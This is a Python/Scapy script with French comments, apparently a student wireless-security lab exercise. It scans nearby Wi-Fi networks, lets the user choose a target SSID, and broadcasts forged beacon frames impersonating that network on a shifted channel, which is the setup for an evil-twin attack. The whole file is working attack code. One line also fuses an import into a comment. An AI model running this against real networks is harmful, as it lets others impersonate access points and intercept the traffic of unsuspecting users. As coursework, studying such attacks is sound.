# Authors : Delphine Scherler & Wenes Limem
# Date : 31.03.2022from scapy.all import *
# Description : Ce script dresse une liste des SSID disponibles à proximité et la présente à l'utilisateur,
# avec les numéros de canaux et les puissances. L'utilisateur peut choisir le réseau à attaquer. Puis le script
# génère un beacon concurrent annonçant un réseau sur un canal différent se trouvant à 6 canaux de séparation du réseau
# original

from scapy.layers.dot11 import *
from scapy.layers.dot11 import Dot11Beacon, Dot11, Dot11Elt, RadioTap

ap_list = {}


# method to add discovered AP in a list
def add_network(pkt):
    if pkt.haslayer(Dot11Beacon):
        # extract the MAC address of the network
        essid = pkt[Dot11Elt].info
        # extract signal
        try:
            dbm_signal = pkt.dBm_AntSignal
        except:
            dbm_signal = "N/A"
        # extract network stats
        stats = pkt[Dot11Beacon].network_stats()
        # get the channel of the AP
        channel = stats.get("channel")
        # add it to the list
        if essid not in ap_list:
            ap_list[essid] = [essid, dbm_signal, channel]


# method to change channel
def channel_hop(ch):
    new_ch = (int(ch) + 6) % 14
    return int(new_ch)


# method to generate beacon
def generate_beacon(iface, ssid, ch):
    # we need a random sender MAC address
    sender_MAC = RandMAC()
    # 802.11 frame
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=sender_MAC, addr3=sender_MAC)
    bc = Dot11Beacon(cap="ESS+privacy")
    channel = Dot11Elt(ID="DSset", info=chr(ch))
    essid = Dot11Elt(ID="SSID", info=ssid, len=len(ssid))
    pkt = RadioTap() / dot11 / bc / essid / channel
    sendp(pkt, iface=iface, loop=2, inter=0.2)


if __name__ == "__main__":
    # interface name
    interface = "wlan0"
    t_out = input("Sniffing timeout: ")
    # start sniffing
    sniff(prn=add_network, iface=interface, timeout=int(t_out))

    # display scanned AP
    cnt = 0
    channels = []
    ssids = []
    print("Liste d'Access point scanned:")
    for i in ap_list:
        cnt += 1
        channels.append(ap_list.get(i)[2])
        ssids.append(ap_list.get(i)[0])
        print(cnt, ap_list.get(i))

    # user select target network
    tg_index = int(input("Tapez le numero de la cible : "))
    tg_ch = channels[int(tg_index) - 1]
    tg_ssid = ssids[int(tg_index - 1)]

    # change channel
    hop_Ch = channel_hop(tg_ch)
    # send beacon
    generate_beacon(interface, tg_ssid, hop_Ch)
